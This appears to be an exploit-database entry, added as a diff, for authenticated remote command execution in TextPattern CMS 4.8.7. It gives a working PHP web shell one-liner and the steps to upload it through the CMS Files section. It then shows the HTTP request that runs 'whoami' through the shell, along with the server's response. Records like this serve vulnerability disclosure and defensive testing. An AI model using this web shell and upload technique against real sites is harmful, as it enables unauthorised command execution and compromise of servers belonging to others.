@@ -1,0 +1,43 @@
+# Exploit Title : TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)
+# Date : 2021/09/06
+# Exploit Author : Mert Daş merterpreter@gmail.com
+# Software Link : https://textpattern.com/file_download/113/textpattern-4.8.7.zip
+# Software web : https://textpattern.com/
+# Tested on: Server : Xampp
+
+First of all we should use file upload section to upload our shell.
+Our shell contains this malicious code: <?PHP system($_GET['cmd']);?>
+
+1) Go to content section .
+2) Click Files and upload malicious php file.
+3) go to yourserver/textpattern/files/yourphp.php?cmd=yourcode;
+
+After upload our file , our request and respons is like below :
+
+Request:
+
+GET /textpattern/files/cmd.php?cmd=whoami HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)
+Gecko/20100101 Firefox/89.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: txp_login_public=18e9bf4a21admin; language=en-gb; currency=GBP;
+PHPSESSID=cctbu6sj8571j2t6vp7g8ab7gi
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 10 Jun 2021 00:32:41 GMT
+Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20
+X-Powered-By: PHP/7.4.20
+Content-Length: 22
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+pc\mertdas
